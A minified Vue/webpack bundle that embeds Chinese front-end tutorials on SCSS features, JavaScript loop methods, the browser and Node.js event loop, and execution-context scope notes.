插值语句可以在选择器或属性名中使用变量。当有两个页面的样式类似时，我们会将类似的样式抽取成页面混合器，但两个不同的页面样式的命名名称根据`BEM`命名规范不能一样，这时我们可使用插值进行动态命名。\r\n\r\n**实例1：页面级混合器中的类名利用#{}插值进行动态设置**\r\n\r\n```\r\n@mixin home-content($class) { \r\n .#{$class} {   \r\n   position: relative;    \r\n   background-color: #fff;    \r\n   overflow-x: hidden;    \r\n   overflow-y: hidden;    \r\n &--left {     \r\n    margin-left: 160px;  \r\n }    \r\n &--noleft {  \r\n    margin-left: 0;  \r\n } \r\n }\r\n}\r\n```\r\n\r\n## 8、运算的使用\r\n\r\n`SassScript` 支持数字的加减乘除、取整等运算 (+, -, *, /, %)\r\n\r\n**实例1：input组件根据输入框的高度设置左右内边距，如下所示：**\r\n\r\n```\r\n.ps-input { \r\n   display: block;  \r\n   &__inner {   \r\n    -webkit-appearance: none;  \r\n     padding-left: #{$--input-height + 10\r\n   };    \r\n     padding-right: #{$--input-height + 10\r\n   };    \r\n  }\r\n}\r\n```\r\n\r\n## 9、相关scss自带函数的应用\r\n\r\n`scss`自带一些函数，例如`hsl`、`mix`函数等。\r\n\r\n**实例1：button组件的点击后颜色是将几种颜色根据一定的比例混合在一起，生成另一种颜色。**如下所示：\r\n\r\n```\r\n&:focus { \r\n  color: mix($--color-white, $--color-primary, $--button-hover-tint-percent);  \r\n  border-color: transparent;  \r\n  background-color: transparent;}\r\n&:active {  \r\n  color: mix($--color-black, $--color-primary, $--button-active-shade-percent); \r\n  border-color: transparent;  background-color: transparent;\r\n}\r\n```\r\n\r\n## 10、相关scss自带函数的应用\r\n\r\n`@for`指令可以在限制的范围内重复输出样式，每次按变量的值对输出结果进行变动。\r\n\r\n**实例1：例如项目中需要设置hwicon类底下第2到8个div子节点需设置样式**，如下所示：\r\n\r\n```\r\n@for $i from 2 through 8 {  \r\n.com-hwicon {    \r\n > div:nth-child(#{$i}) {   \r\n   position: relative;    \r\n   float: right;   \r\n  }  \r\n }\r\n}\r\n```\r\n\r\n## 11、each遍历、map数据类型、@mixin/[@include] 混合器、#{}插值 结合使用\r\n\r\n可通过结合`each`遍历、`map`数据类型、`@mixin/@include`混合器、#{}插值，从而生成不同的选择器类，并且每个选择器类中的背景图片不同，如下所示：\r\n\r\n```\r\n$img-list: (  \r\n (accessimg, $papers-access),   \r\n (folderimg, $papers-folder),  \r\n (bmpimg, $papers-bmp),   \r\n (xlsimg, $papers-excel),   \r\n (xlsximg, $papers-excel),   \r\n (gifimg, $papers-gif),  \r\n (jpgimg, $papers-jpg),   \r\n (unknownimg, $papers-unknown)\r\n);\r\n\r\n@each $label, $value in $img-list { \r\n .com-hwicon__#{$label} {\r\n    @include commonImg($value); \r\n }\r\n}\r\n```\r\n\r\n",er={data:function(){return{MainComponent:tr}}},ar=er,ir=Object(u["a"])(ar,nr,rr,!1,null,"f758c71e",null),sr=ir.exports,or=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},lr=[],cr={},pr=cr,ur=Object(u["a"])(pr,or,lr,!1,null,"232157bc",null),mr=ur.exports,dr=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},gr=[],br={},vr=br,hr=Object(u["a"])(vr,dr,gr,!1,null,"7709893a",null),Sr=hr.exports,yr=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div")},fr=[],_r={},xr=_r,wr=Object(u["a"])(xr,yr,fr,!1,null,"b6f36ad6",null),Er=wr.exports,Tr={mixins:[xn["a"]],components:{m1:Dn,m2:Un,m4:Zn,m5:sr,m6:mr,m7:Sr,m8:Er},data:function(){return{tab:"m1",tab_level:2,tabs:[{label:"显隐",value:"m1"},{label:"全面梳理",value:"m2"},{label:"var()",value:"m4"},{label:"SASS总结",value:"m5"}]}}},kr=Tr,Cr=Object(u["a"])(kr,Cn,jn,!1,null,"f9efcd88",null),jr=Cr.exports,Mr=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("div",{staticClass:"q-mx-lg"},[t(""+n.tab,{tag:"component"})],1)])},Rr=[],Lr=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},Or=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("div",{staticClass:"post"},[t("h4",{staticClass:"postTitle"},[n._v("\n     javascript中的12种循环遍历方法1\n    ")]),t("div",{staticClass:"clear"}),t("div",{staticClass:"postBody"},[t("div",{staticClass:"blogpost-body ",attrs:{id:"cnblogs_post_body"}},[t("p",[n._v("1：for循环")]),t("p",[n._v("let arr = [1,2,3];")]),t("p",[n._v("for(let i =0;i<arr.length;i++){")]),t("p",[n._v("console.log(i,arr[i])")]),t("p",[n._v("}")]),t("p",[n._v("//for循环是js中最常用的一个循环工具，经常用来数组的循环遍历，")]),t("p",[n._v("2：for in循环")]),t("p",[n._v("let obj = {name: 'xiao' ,age:'24'}")]),t("p",[n._v("for(let i in obj){")]),t("p",[n._v("console.log(i,obj[i]);")]),t("p",[n._v("}")]),t("p",[n._v("\n          //for in 循环主要用于遍历普通对象，i 代表对象的 key 值，obj[i]\n          代表对应的\n          value,当用它来遍历数组时候，多数情况下也能达到同样的效果，但是你不要这么做，这是有风险的，因为\n          i\n          输出为字符串形式，而不是数组需要的数字下标，这意味着在某些情况下，会发生字符串运算，导致数据错误，比如：'52'+1\n          = '521' 而不是我们需要的 53。另外 for in\n          循环的时候，不仅遍历自身的属性，还会找到 prototype\n          上去，所以最好在循环体内加一个判断，就用\n          obj[i].hasOwnProperty(i)，这样就避免遍历出太多不需要的属性。\n        ")]),t("p",[n._v("3：while循环")]),t("div",{staticClass:"line number1 index0 alt2"},[t("code",{staticClass:"js plain"},[n._v("let cars=[")]),t("code",{staticClass:"js string"},[n._v('"BMW"')]),t("code",{staticClass:"js plain"},[n._v(",")]),t("code",{staticClass:"js string"},[n._v('"Volvo"')]),t("code",{staticClass:"js plain"},[n._v(",")]),t("code",{staticClass:"js string"},[n._v('"Saab"')]),t("code",{staticClass:"js plain"},[n._v(",")]),t("code",{staticClass:"js string"},[n._v('"Ford"')]),t("code",{staticClass:"js plain"},[n._v("];")])]),t("div",{staticClass:"line number2 index1 alt1"},[t("span",{staticStyle:{"font-family":"monospace"}},[n._v("let")]),n._v(" "),t("code",{staticClass:"js plain"},[n._v("i=0;")])]),t("div",{staticClass:"line number3 index2 alt2"},[t("code",{staticClass:"js keyword"},[n._v("while")]),t("code",{staticClass:"js plain"},[n._v("(cars[i])")])]),t("div",{staticClass:"line number4 index3 alt1"},[t("code",{staticClass:"js plain"},[n._v("{")])]),t("div",{staticClass:"line number5 index4 alt2"},[t("code",{staticClass:"js plain"},[n._v("console.log(cars[i] + ")]),t("code",{staticClass:"js string"},[n._v('"<br>"')]),t("code",{staticClass:"js plain"},[n._v(")")])]),t("div",{staticClass:"line number6 index5 alt1"},[t("code",{staticClass:"js plain"},[n._v("i++;")])]),t("div",{staticClass:"line number7 index6 alt2"},[t("code",{staticClass:"js plain"},[n._v("};")])]),t("div",{staticClass:"line number7 index6 alt2"},[n._v("4：do while循环")]),t("div",{staticClass:"line number7 index6 alt2"},[t("div",{staticClass:"line number1 index0 alt2"},[t("code",{staticClass:"js plain"},[n._v("let i = 3;")])]),t("div",{staticClass:"line number2 index1 alt1"},[t("code",{staticClass:"js keyword"},[n._v("do")]),t("code",{staticClass:"js plain"},[n._v("{")])]),t("div",{staticClass:"line number3 index2 alt2"},[t("code",{staticClass:"js spaces"},[n._v(" ")]),t("code",{staticClass:"js plain"},[n._v("console.log(i)")])]),t("div",{staticClass:"line number4 index3 alt1"},[t("code",{staticClass:"js spaces"},[n._v(" ")]),t("code",{staticClass:"js plain"},[n._v("i--;")])]),t("div",{staticClass:"line number5 index4 alt2"},[t("code",{staticClass:"js plain"},[n._v("}")])]),t("div",{staticClass:"line number6 index5 alt1"},[t("code",{staticClass:"js keyword"},[n._v("while")]),t("code",{staticClass:"js plain"},[n._v("(i>0)")])]),t("div",{staticClass:"line number6 index5 alt1"},[n._v("\n            //do while 循环是 while\n            循环的一个变体，它首先执行一次操作，然后才进行条件判断，是 true\n            的话再继续执行操作，是 false 的话循环结束。\n          ")]),t("div",{staticClass:"line number6 index5 alt1"},[n._v("5：Array forEach循环")]),t("div",{staticClass:"line number6 index5 alt1"},[t("div",{staticClass:"line number1 index0 alt2"},[t("code",{staticClass:"js plain"},[n._v("let arr = [1,2,3];")])]),t("div",{staticClass:"line number2 index1 alt1"},[t("code",{staticClass:"js plain"},[n._v("arr.forEach(")]),t("code",{staticClass:"js keyword"},[n._v("function")]),t("code",{staticClass:"js plain"},[n._v("(i,index){")])]),t("div",{staticClass:"line number3 index2 alt2"},[t("code",{staticClass:"js spaces"},[n._v(" ")]),t("code",{staticClass:"js plain"},[n._v("console.log(i,index)")])]),t("div",{staticClass:"line number4 index3 alt1"},[t("code",{staticClass:"js plain"},[n._v("})")])]),t("div",{staticClass:"line number4 index3 alt1"},[n._v("\n              //forEach循环，循环数组中每一个元素并采取操作， 没有返回值，\n              可以不用知道数组长度,他有三个参数，只有第一个是必需的，代表当前下标下的\n              value。\n              "),t("p",[n._v("\n                另外请注意，forEach\n                循环在所有元素调用完毕之前是不能停止的，它没有 break\n                语句，如果你必须要停止，可以尝试 try catch\n                语句，就是在要强制退出的时候，抛出一个 error 给 catch\n                捕捉到，然后在 catch 里面\n                return，这样就能中止循环了，如果你经常用这个方法，最好自定义一个这样的\n                forEach 函数在你的库里。\n              ")]),t("p",[n._v("6：Array map（)方法")]),t("p",[n._v("let  arr = [1,2,3];")]),t("p",[n._v("let tt = arr.map(function(i){")]),t("p",[n._v("console.log(i);")]),t("p",[n._v("return i*2;")]),t("p",[n._v("})")]),t("p",[n._v("\n                //map()\n                方法返回一个新数组，数组中的元素为原始数组元素调用函数处理后的值。"),t("br"),n._v("注意：map\n                和 forEach 方法都是只能用来遍历数组，不能用来遍历普通对象。\n              ")]),t("p",[n._v("7:Array filter()方法")]),t("p",[n._v("let arr = [1,2,3];")]),t("p",[n._v("let tt= arr.filter(function(i){")]),t("p",[n._v("return i > 1;")]),t("p",[n._v("})")]),t("p",[n._v("\n                //filter 方法是 Array\n                对象内置方法，它会返回通过过滤的元素，不改变原来的数组。\n              ")]),t("p",[n._v("8:Array some()方法")]),t("p",[n._v("let arr =[1,2,3];")]),t("p",[n._v("let tt = arr.some(function(i){")]),t("p",[n._v("return i > 1;")]),t("p",[n._v("})")]),t("p",[n._v("\n                //some()\n                方法用于检测数组中的元素是否满足指定条件（函数提供）,返回\n                boolean 值，不改变原数组。\n              ")]),t("p",[n._v("9:Array every()方法")]),t("p",[n._v("let arr = [1,2,3];")]),t("p",[n._v("let tt = arr.some(function(i){")]),t("p",[n._v("return i > 1;")]),t("p",[n._v("})")]),t("p",[n._v("\n                //every()\n                方法用于检测数组所有元素是否都符合指定条件（通过函数提供），返回\n                boolean 值，不改变原数组。\n              ")]),t("p",[n._v("10:Array reduce()方法")]),t("p",[n._v("let arr = [1,2,3];")]),t("p",[n._v("let ad = arr.reduce(function(i,j){")]),t("p",[n._v("return i + j;")]),t("p",[n._v("})")]),t("p",[n._v("\n                //reduce()\n                方法接收一个函数作为累加器，数组中的每个值（从左到右）开始缩减，最终计算为一个值。\n              ")]),t("p",[n._v("11:Array reduceRight()方法")]),t("p",[n._v("let arr = [1,2,3];")]),t("p",[n._v("let ad = arr.reduceRight(function(i,j){")]),t("p",[n._v("return i + j;")]),t("p",[n._v("})")]),t("p",[n._v("\n                //reduceRight()方法,和 reduce()\n                功能是一样的，它是从数组的末尾处向前开始计算。\n              ")]),t("p",[n._v("12:for of 循环")]),t("p",[n._v("let arr = ['name','age'];")]),t("p",[n._v("for(let i of arr){")]),t("p",[n._v("console.log(i);")]),t("p",[n._v("}")]),t("p",[n._v("\n                //for of 循环是 Es6 中新增的语句，用来替代 for in 和\n                forEach，它允许你遍历 Arrays（数组）, Strings（字符串）,\n                Maps（映射）, Sets（集合）等可迭代(Iterable\n                data)的数据结构,注意它的兼容性。\n              ")])])])])])])])])}],Ar={},Ir=Ar,Dr=Object(u["a"])(Ir,Lr,Or,!1,null,"52c7d328",null),Pr=Dr.exports,Nr=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},qr=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("article",{staticClass:"post"},[t("header",{staticClass:"post-header"},[t("h4",{staticClass:"post-title"},[n._v("\n          什么是Event Loop？\n        ")])]),t("div",{staticClass:"post-body"},[t("h4",[n._v("\n    \n          为什么JavaScript是单线程？\n        ")]),t("p",[n._v("\n          JavaScript语言的一大特点就是单线程，也就是说，同一个时间只能做一件事。那么，为什么JavaScript不能有多个线程呢？这样能提高效率啊。\n        ")]),t("p",[n._v("\n          JavaScript的单线程，与它的用途有关。作为浏览器脚本语言，JavaScript的主要用途是与用户互动，以及操作DOM。这决定了它只能是单线程，否则会带来很复杂的同步问题。比如，假定JavaScript同时有两个线程，一个线程在某个DOM节点上添加内容，另一个线程删除了这个节点，这时浏览器应该以哪个线程为准？\n        ")]),t("p",[n._v("\n          所以，为了避免复杂性，从一诞生，JavaScript就是单线程，这已经成了这门语言的核心特征，将来也不会改变。\n        ")]),t("p",[n._v("\n          为了利用多核CPU的计算能力，HTML5提出Web\n          Worker标准，允许JavaScript脚本创建多个线程，但是子线程完全受主线程控制，且不得操作DOM。所以，这个新标准并没有改变JavaScript单线程的本质。\n        ")]),t("h4",{attrs:{id:"任务队列"}},[t("a",{staticClass:"headerlink",attrs:{href:"#任务队列",title:"任务队列"}}),n._v("任务队列\n        ")]),t("p",[n._v("\n          单线程就意味着，所有任务需要排队，前一个任务结束，才会执行后一个任务。如果前一个任务耗时很长，后一个任务就不得不一直等着。\n        ")]),t("p",[n._v("\n          如果排队是因为计算量大，CPU忙不过来，倒也算了，但是很多时候CPU是闲着的，因为IO设备（输入输出设备）很慢（比如Ajax操作从网络读取数据），不得不等着结果出来，再往下执行。\n        ")]),t("p",[n._v("\n          JavaScript语言的设计者意识到，这时主线程完全可以不管IO设备，挂起处于等待中的任务，先运行排在后面的任务。等到IO设备返回了结果，再回过头，把挂起的任务继续执行下去。\n        ")]),t("p",[n._v("\n          于是，所有任务可以分成两种，一种是同步任务（synchronous），另一种是异步任务（asynchronous）。同步任务指的是，在主线程上排队执行的任务，只有前一个任务执行完毕，才能执行后一个任务；异步任务指的是，不进入主线程、而进入”任务队列”（task\n          queue）的任务，只有”任务队列”通知主线程，某个异步任务可以执行了，该任务才会进入主线程执行。\n        ")]),t("p",[n._v("\n          具体来说，异步执行的运行机制如下。（同步执行也是如此，因为它可以被视为没有异步任务的异步执行。）\n        ")]),t("ol",[t("li",[n._v("\n            所有同步任务都在主线程上执行，形成一个执行栈（execution context\n            stack）。\n          ")]),t("li",[n._v("\n            主线程之外，还存在一个”任务队列”（task\n            queue）。只要异步任务有了运行结果，就在”任务队列”之中放置一个事件。\n          ")]),t("li",[n._v("\n            一旦”执行栈”中的所有同步任务执行完毕，系统就会读取”任务队列”，看看里面有哪些事件。那些对应的异步任务，于是结束等待状态，进入执行栈，开始执行。\n          ")]),t("li",[n._v("主线程不断重复上面的第三步。")])]),t("p",[n._v("下图就是主线程和任务队列的示意图。")]),t("p",[n._v("任务队列")]),t("p",[n._v("\n          只要主线程空了，就会去读取”任务队列”，这就是JavaScript的运行机制。\n        ")]),t("p",[n._v("这个过程会不断重复。")]),t("h4",{attrs:{id:"事件和回调函数"}},[t("a",{staticClass:"headerlink",attrs:{href:"#事件和回调函数",title:"事件和回调函数"}}),n._v("事件和回调函数\n        ")]),t("p",[n._v("\n          “任务队列”是一个事件的队列（也可以理解成消息的队列），IO设备完成一项任务，就在”任务队列”中添加一个事件，表示相关的异步任务可以进入”执行栈”了。主线程读取”任务队列”，就是读取里面有哪些事件。\n        ")]),t("p",[n._v("\n          “任务队列”中的事件，除了IO设备的事件以外，还包括一些用户产生的事件（比如鼠标点击、页面滚动等等）。只要指定过回调函数，这些事件发生时就会进入”任务队列”，等待主线程读取。\n        ")]),t("p",[n._v("\n          所谓”回调函数”（callback），就是那些会被主线程挂起来的代码。异步任务必须指定回调函数，当主线程开始执行异步任务，就是执行对应的回调函数。\n        ")]),t("p",[n._v("\n          “任务队列”是一个先进先出的数据结构，排在前面的事件，优先被主线程读取。主线程的读取过程基本上是自动的，只要执行栈一清空，”任务队列”上第一位的事件就自动进入主线程。但是，由于存在后文提到的”定时器”功能，主线程首先要检查一下执行时间，某些事件只有到了规定的时间，才能返回主线程。\n        ")]),t("h4",{attrs:{id:"Event-Loop"}},[t("a",{staticClass:"headerlink",attrs:{href:"#Event-Loop",title:"Event Loop"}}),n._v("Event\n          Loop\n        ")]),t("p",[n._v("\n          主线程从”任务队列”中读取事件，这个过程是循环不断的，所以整个的这种运行机制又称为Event\n          Loop（事件循环）。\n        ")]),t("p",[n._v("\n          为了更好地理解Event Loop，请看下图（转引自Philip Roberts的演讲《Help,\n          I’m stuck in an event-loop》）。\n        ")]),t("p",[n._v("\n          上图中，主线程运行的时候，产生堆（heap）和栈（stack），栈中的代码调用各种外部API，它们在”任务队列”中加入各种事件（click，load，done）。只要栈中的代码执行完毕，主线程就会去读取”任务队列”，依次执行那些事件所对应的回调函数。\n        ")]),t("p",[n._v("\n          执行栈中的代码（同步任务），总是在读取”任务队列”（异步任务）之前执行。请看下面这个例子。\n        ")]),t("pre",[t("code",[n._v("var req = new XMLHttpRequest();\nreq.open('GET', url);    \nreq.onload = function (){};    \nreq.onerror = function (){};    \nreq.send();\n")])]),t("p",[n._v("\n          上面代码中的req.send方法是Ajax操作向服务器发送数据，它是一个异步任务，意味着只有当前脚本的所有代码执行完，系统才会去读取”任务队列”。所以，它与下面的写法等价。\n        ")]),t("pre",[t("code",[n._v("var req = new XMLHttpRequest();\nreq.open('GET', url);\nreq.send();\nreq.onload = function (){};    \nreq.onerror = function (){};   \n")])]),t("p",[n._v("\n          也就是说，指定回调函数的部分（onload和onerror），在send()方法的前面或后面无关紧要，因为它们属于执行栈的一部分，系统总是执行完它们，才会去读取”任务队列”。\n        ")]),t("h4",{attrs:{id:"定时器"}},[t("a",{staticClass:"headerlink",attrs:{href:"#定时器",title:"定时器"}}),n._v("定时器\n        ")]),t("p",[n._v("\n          除了放置异步任务的事件，”任务队列”还可以放置定时事件，即指定某些代码在多少时间之后执行。这叫做”定时器”（timer）功能，也就是定时执行的代码。\n        ")]),t("p",[n._v("\n          定时器功能主要由setTimeout()和setInterval()这两个函数来完成，它们的内部运行机制完全一样，区别在于前者指定的代码是一次性执行，后者则为反复执行。以下主要讨论setTimeout()。\n        ")]),t("p",[n._v("\n          setTimeout()接受两个参数，第一个是回调函数，第二个是推迟执行的毫秒数。\n        ")]),t("pre",[t("code",[n._v("console.log(1);\nsetTimeout(function(){console.log(2);},1000);\nconsole.log(3);\n")])]),t("p",[n._v("\n          上面代码的执行结果是1，3，2，因为setTimeout()将第二行推迟到1000毫秒之后执行。\n        ")]),t("p",[n._v("\n          如果将setTimeout()的第二个参数设为0，就表示当前代码执行完（执行栈清空）以后，立即执行（0毫秒间隔）指定的回调函数。\n        ")]),t("pre",[t("code",[n._v("setTimeout(function(){console.log(1);}, 0);\nconsole.log(2);\n")])]),t("p",[n._v("\n          上面代码的执行结果总是2，1，因为只有在执行完第二行以后，系统才会去执行”任务队列”中的回调函数。\n        ")]),t("p",[n._v("\n          总之，setTimeout(fn,0)的含义是，指定某个任务在主线程最早可得的空闲时间执行，也就是说，尽可能早得执行。它在”任务队列”的尾部添加一个事件，因此要等到同步任务和”任务队列”现有的事件都处理完，才会得到执行。"),t("br"),n._v("HTML5标准规定了setTimeout()的第二个参数的最小值（最短间隔），不得低于4毫秒，如果低于这个值，就会自动增加。在此之前，老版本的浏览器都将最短间隔设为10毫秒。另外，对于那些DOM的变动（尤其是涉及页面重新渲染的部分），通常不会立即执行，而是每16毫秒执行一次。这时使用requestAnimationFrame()的效果要好于setTimeout()。\n        ")]),t("p",[n._v("\n          需要注意的是，setTimeout()只是将事件插入了”任务队列”，必须等到当前代码（执行栈）执行完，主线程才会去执行它指定的回调函数。要是当前代码耗时很长，有可能要等很久，所以并没有办法保证，回调函数一定会在setTimeout()指定的时间执行。\n        ")]),t("h4",{attrs:{id:"Node-js的Event-Loop"}},[t("a",{staticClass:"headerlink",attrs:{href:"#Node-js的Event-Loop",title:"Node.js的Event Loop"}}),n._v("Node.js的Event Loop\n        ")]),t("p",[n._v("\n          Node.js也是单线程的Event Loop，但是它的运行机制不同于浏览器环境。"),t("br"),n._v("请看下面的示意图（作者@BusyRich）。\n        ")]),t("p",[n._v("Node.js")]),t("p",[n._v("根据上图，Node.js的运行机制如下。")]),t("ol",[t("li",[n._v("V8引擎解析JavaScript脚本。")]),t("li",[n._v("解析后的代码，调用Node API。")]),t("li",[n._v("\n            libuv库负责Node\n            API的执行。它将不同的任务分配给不同的线程，形成一个Event\n            Loop（事件循环），以异步的方式将任务的执行结果返回给V8引擎。\n          ")]),t("li",[n._v("V8引擎再将结果返回给用户。")])]),t("p",[n._v("\n          除了setTimeout和setInterval这两个方法，Node.js还提供了另外两个与”任务队列”有关的方法：process.nextTick和setImmediate。它们可以帮助我们加深对”任务队列”的理解。\n        ")]),t("p",[n._v("\n          process.nextTick方法可以在当前”执行栈”的尾部—-下一次Event\n          Loop（主线程读取”任务队列”）之前—-触发回调函数。也就是说，它指定的任务总是发生在所有异步任务之前。setImmediate方法则是在当前”任务队列”的尾部添加事件，也就是说，它指定的任务总是在下一次Event\n          Loop时执行，这与setTimeout(fn, 0)很像。请看下面的例子（via\n          StackOverflow）。\n        ")]),t("pre",[t("code",[n._v("process.nextTick(function A() {\n    console.log(1);\n    process.nextTick(function B(){console.log(2);});\n});\n\nsetTimeout(function timeout() {\n    console.log('TIMEOUT FIRED');\n}, 0)\n// 1\n// 2\n// TIMEOUT FIRED\n")])]),t("p",[n._v("\n          上面代码中，由于process.nextTick方法指定的回调函数，总是在当前”执行栈”的尾部触发，所以不仅函数A比setTimeout指定的回调函数timeout先执行，而且函数B也比timeout先执行。这说明，如果有多个process.nextTick语句（不管它们是否嵌套），将全部在当前”执行栈”执行。\n        ")]),t("p",[n._v("现在，再看setImmediate。")]),t("pre",[t("code",[n._v("setImmediate(function A() {\n    console.log(1);\n    setImmediate(function B(){console.log(2);});\n});\n\nsetTimeout(function timeout() {\n    console.log('TIMEOUT FIRED');\n}, 0);\n")])]),t("p",[n._v("\n          上面代码中，setImmediate与setTimeout(fn,0)各自添加了一个回调函数A和timeout，都是在下一次Event\n          Loop触发。那么，哪个回调函数先执行呢？答案是不确定。运行结果可能是1–TIMEOUT\n          FIRED–2，也可能是TIMEOUT FIRED–1–2。\n        ")]),t("p",[n._v("\n          令人困惑的是，Node.js文档中称，setImmediate指定的回调函数，总是排在setTimeout前面。实际上，这种情况只发生在递归调用的时候。\n        ")]),t("pre",[t("code",[n._v("setImmediate(function (){\n    setImmediate(function A() {\n    console.log(1);\n    setImmediate(function B(){console.log(2);});\n});\n\nsetTimeout(function timeout() {\n    console.log('TIMEOUT FIRED');\n}, 0);\n});\n// 1\n// TIMEOUT FIRED\n// 2\n")])]),t("p",[n._v("\n          上面代码中，setImmediate和setTimeout被封装在一个setImmediate里面，它的运行结果总是1–TIMEOUT\n          FIRED–2，这时函数A一定在timeout前面触发。至于2排在TIMEOUT\n          FIRED的后面（即函数B在timeout后面触发），是因为setImmediate总是将事件注册到下一轮Event\n          Loop，所以函数A和timeout是在同一轮Loop执行，而函数B在下一轮Loop执行。\n        ")]),t("p",[n._v("\n          我们由此得到了process.nextTick和setImmediate的一个重要区别：多个process.nextTick语句总是在当前”执行栈”一次执行完，多个setImmediate可能则需要多次loop才能执行完。事实上，这正是Node.js\n          10.0版添加setImmediate方法的原因，否则像下面这样的递归调用process.nextTick，将会没完没了，主线程根本不会去读取”事件队列”！\n        ")]),t("pre",[t("code",[n._v("process.nextTick(function foo() {\n    process.nextTick(foo);\n});\n")])]),t("p",[n._v("\n          事实上，现在要是你写出递归的process.nextTick，Node.js会抛出一个警告，要求你改成setImmediate。\n        ")]),t("p",[n._v("\n          另外，由于process.nextTick指定的回调函数是在本次”事件循环”触发，而setImmediate指定的是在下次”事件循环”触发，所以很显然，前者总是比后者发生得早，而且执行效率也高（因为不用检查”任务队列”）。\n        ")])]),t("footer",{staticClass:"post-footer"},[t("div",{staticClass:"post-tags"}),t("div",{staticClass:"post-nav"},[t("div",{staticClass:"post-nav-next post-nav-item"},[t("i",{staticClass:"fa fa-chevron-left"}),t("a",{attrs:{href:"https://www.dazhuanlan.com/2019/11/06/5dc2c545b1c36/",rel:"next"}},[n._v("笔记23")])]),t("div",{staticClass:"post-nav-prev post-nav-item"},[t("a",{attrs:{href:"https://www.dazhuanlan.com/2019/11/06/5dc2c4f9a8f83/",rel:"prev"}},[n._v("Hexo Build")]),t("i",{staticClass:"fa fa-chevron-right"})])])]),t("div",{staticClass:"crp_related "},[t("h4",[n._v("相关文章")]),t("ul",[t("li",[t("a",{attrs:{href:"https://www.dazhuanlan.com/2019/09/04/98fb83cd7703/",target:"_blank"}},[t("span",{staticClass:"crp_title"},[n._v("[Javascript] for loop vs for-in loop 与性能改善")])])]),t("li",[t("a",{attrs:{href:"https://www.dazhuanlan.com/2019/09/30/5d914e8611fc2/",target:"_blank"}},[t("span",{staticClass:"crp_title"},[n._v("for loop vs for-in loop 與效能改善")])])]),t("li",[t("a",{attrs:{href:"https://www.dazhuanlan.com/2019/09/02/ed62ffaa05bc/",target:"_blank"}},[t("span",{staticClass:"crp_title"},[n._v("[ASP.NET] for loop 与 foreach")])])]),t("li",[t("a",{attrs:{href:"https://www.dazhuanlan.com/2019/09/04/2cdae5cc2626/",target:"_blank"}},[t("span",{staticClass:"crp_title"},[n._v("Self referencing loop detected for property")])])]),t("li",[t("a",{attrs:{href:"https://www.dazhuanlan.com/2019/09/04/1c1dc87e826f/",target:"_blank"}},[t("span",{staticClass:"crp_title"},[n._v("[cmd命令学习心得]循环(for loop)")])])]),t("li",[t("a",{attrs:{href:"https://www.dazhuanlan.com/2019/09/04/da5085d3ca0f/",target:"_blank"}},[t("span",{staticClass:"crp_title"},[n._v("Flex Multi-URLLoader with For Loop")])])]),t("li",[t("a",{attrs:{href:"https://www.dazhuanlan.com/2019/09/05/ca322d7f295d/",target:"_blank"}},[t("span",{staticClass:"crp_title"},[n._v("[MSSQL][PLSQL]FOR LOOP")])])]),t("li",[t("a",{attrs:{href:"https://www.dazhuanlan.com/2019/09/12/cdaa76e25a15/",target:"_blank"}},[t("span",{staticClass:"crp_title"},[n._v("[Sass][Visual Studio] SASS 进阶使用 (Media, color…")])])]),t("li",[t("a",{attrs:{href:"https://www.dazhuanlan.com/2019/07/03/vb6vbavb-net-%e5%86%8d%e8%b0%88-timer-%e6%8e%a7%e4%bb%b6-%e6%97%b6%e9%97%b4%e5%88%86%e8%be%a8%e7%8e%87%e8%bf%87%e4%bd%8e%e7%9a%84%e8%a7%a3%e5%86%b3%e6%96%b9%e6%b3%95%ef%bc%88%e4%ba%8c%ef%bc%89/",target:"_blank"}},[t("span",{staticClass:"crp_title"},[n._v("[VB6][VBA][VB.net] 再谈 Timer 控件 -\n                时间分辨率过低的解决方法（二）用…")])])]),t("li",[t("a",{attrs:{href:"https://www.dazhuanlan.com/2019/07/03/teaching-silverlight-30%e7%a7%92%e5%bf%ab%e9%80%9f%e5%bb%ba%e7%ab%8b%e6%b8%b8%e6%88%8f%e5%be%aa%e7%8e%af-game-loop/",target:"_blank"}},[t("span",{staticClass:"crp_title"},[n._v("[Teaching] [Silverlight] 30秒快速建立游戏循环 (Game Loop)")])])])]),t("div",{staticClass:"crp_clear"})])])])}],Hr={},Br=Hr,Fr=Object(u["a"])(Br,Nr,qr,!1,null,"40d3e81b",null),Ur=Fr.exports,Jr=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},zr=[],Wr='# js\r\n\r\n## 作用域\r\n\r\n### 执行上下文\r\n\r\n- 变量对象 AO\r\n\r\n\t- 变量对象是与执行上下文相关的数据作用域\r\n\r\n\t\t- 全局上下文\r\n\r\n\t\t\t- 变量对象即全局对象\r\n\r\n\t\t- 函数上下文\r\n\r\n\t\t\t- 活动对象，是由引擎实现的，在执行上下文中被激活\r\n\r\n\t\t- AO（活动变量） = VO（变量对象 + function parameters + arguments\r\n\r\n\t- 变量对象在执行过程中的变化\r\n\r\n\t\t- 进入执行上下文\r\n\r\n\t\t\t- 创建变量对象\r\n\r\n\t\t- 代码执行\r\n\r\n\t\t\t- 顺序执行代码，修改上下文变量的值\r\n\r\n\t\t- 执行完毕，上下文弹出\r\n\r\n\t- 函数的所有形参\r\n\t- 函数声明\r\n\t- 变量声明\r\n\r\n- 作用域链 Scope\r\n\r\n\t- 函数被创建，保存函数父作用域到函数[[scope]]属性\r\n\t- 函数执行，进入上下文吗，函数作用域压入栈\r\n\t- 复制函数[[scope]]属性，创建作用域链\r\n\t- 用 arguments 创建活动对象，随后初始化活动对象，加入形参、函数声明、变量声明\r\n\t- 将活动对象压入  函数作用域链顶端\r\n\t- 开始执行函数，随着函数的执行，修改 AO 的属性值\r\n\t- 函数执行完毕，函数上下文从执行上下文栈中弹出\r\n\r\n- this\r\n\r\n\t- 简单的理解 this 为调用函数的对象\r\n\r\n- 执行上下文\r\n\r\n\t- JavaScript代码被解析和执行时所在环境的抽象概念\r\n\t- 执行上下文的类型\r\n\r\n\t\t- 全局执行上下文\r\n\r\n\t\t\t- 只有一个，浏览器中的全局对象window，this执行这个全局对象\r\n\r\n\t\t- 